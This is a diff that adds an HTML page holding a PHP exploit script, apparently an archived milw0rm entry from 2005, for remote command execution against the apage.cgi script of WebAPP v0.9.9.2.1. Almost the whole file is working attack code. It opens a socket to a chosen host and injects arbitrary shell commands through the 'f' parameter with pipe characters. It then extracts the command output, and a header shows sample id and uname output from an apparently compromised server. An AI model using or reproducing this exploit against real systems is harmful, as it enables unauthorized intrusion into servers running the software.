@@ -1,0 +1,107 @@
+<html>
+<head>
+<title>WebAPP v0.9.9.2.1 Remote Command Execution Exploit (2nd updated)</title>
+<pre>
+&lt;?php
+
+########################################################
+#                                                      #
+#  WebAPP v0.9.9.2.1 Remote Command Execution Exploit  #
+#                 [Code by Nikyt0x]                    #
+#                 nikyt0x@gmail.com                    #
+#                                                      #
+#    Advisory: www.defacers.com.mx/advisories/3.txt    #                                               #
+#                                                      #
+#    Saludos:                                          #
+#                                                      #
+#    Soulblack Staff, Status-x, NeosecurityTeam,       #
+#    KingMetal, Trespasser...                          #
+#                                                      #
+########################################################
+#                                                      #
+# sbwebapp.php www.host.com /dirto/apage.cgi &quot;command&quot; #
+#                                                      #
+# Linux dprhensim19.doteasy.com 2.4.22-1.2199.nptl     #
+# #1 Wed Aug 4 12:21:48 EDT 2004 i686 i686 i386        #
+# GNU/Linux                                            #
+# uid=557(scapip) gid=558(scapip) groups=558(scapip)   #
+#                                                      #
+#                                                      #
+#                                                      #
+########################################################
+
+
+if ($argc != 4) {
+
+   echo &quot;\n              =====================================\n&quot;;
+   echo &quot;               WebAPP v0.9.9.2.1 apage.cgi Exploit\n&quot;;
+   echo &quot;              =====================================\n&quot;;
+   echo &quot;                    Nikyt0x - SoulBlack Team\n\n&quot;;
+   echo &quot;\nUsage:\n\n&quot;;
+   echo &quot; $argv[0] www.host.com /apagedir/apage.cgi \&quot;command\&quot;\n&quot;;
+   exit(0);
+   }
+
+if(!ereg('apage.cgi',$argv[2])) {
+   echo &quot;URL to apage.cgi Incorrect.&quot;;
+   exit(0);
+   }
+
+   echo &quot;\n              =====================================\n&quot;;
+   echo &quot;               WebAPP v0.9.9.2.1 apage.cgi Exploit\n&quot;;
+   echo &quot;              =====================================\n&quot;;
+   echo &quot;                    Nikyt0x - SoulBlack Team\n\n&quot;;
+
+
+
+
+$s0ck3t = fsockopen($argv[1], 80);
+if (!$s0ck3t) {
+   echo &quot;[-] Socket\n&quot;;
+   exit(0);
+   
+} else {
+   $ex3cutar = str_replace(&quot; &quot;, &quot;%20&quot;, $argv[3]);
+   $petici0n = &quot;GET $argv[2]?f=expofranquicias.htm|echo%20c0mand0s;$ex3cutar;echo%20final1zar| HTTP/1.1\r\n&quot;;
+   $petici0n .= &quot;Host: $argv[1]\r\n&quot;;
+   $petici0n .= &quot;Connection: Close\r\n\r\n&quot;;
+   
+   echo &quot;[+] Socket\n&quot;;
+   
+   if(!fwrite($s0ck3t, $petici0n))
+   {
+   echo &quot;[-] Sending Exploit\n&quot;;
+   exit(0);
+   }
+   echo &quot;[+] Sending Exploit\n&quot;;
+   while (!feof($s0ck3t)) {
+       $g3tdata = fgets($s0ck3t, 1024);
+	   if (eregi('c0mand0s',$g3tdata))
+	   {
+	   $aceptar = 1;
+	   }
+	   if (eregi('final1zar',$g3tdata))
+	   {
+	   $aceptar = 0;
+	   }
+	   while ($aceptar == 1)
+	   {
+	  	   if(eregi('c0mand0s',$g3tdata))
+		   {
+		    $g3tdata = str_replace('c0mand0s','', $g3tdata);
+		   echo &quot;[+] Command:\n&quot;;
+		   }
+		   $g3tdata = str_replace('c0mand0s','', $g3tdata);
+		   echo $g3tdata;
+		   break;
+	   }
+	   
+   }
+   fclose($s0ck3t);
+}
+?&gt; 
+
+# milw0rm.com [2005-05-20]
+</pre>
+</html>
+
